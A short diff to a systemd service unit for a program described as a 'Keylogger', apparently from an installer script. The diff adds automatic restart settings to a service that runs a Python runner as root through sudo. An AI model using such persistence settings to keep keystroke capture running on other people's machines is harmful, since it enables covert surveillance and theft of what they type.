@@ -74,6 +74,8 @@ Description=Keylogger
 [Service]
 RemainAfterExit=yes
 User=root
+Restart=always
+RestartSec=3
 WorkingDirectory=${PWD}
 ExecStart=sudo pipenv run python3 bin/runner.py
 
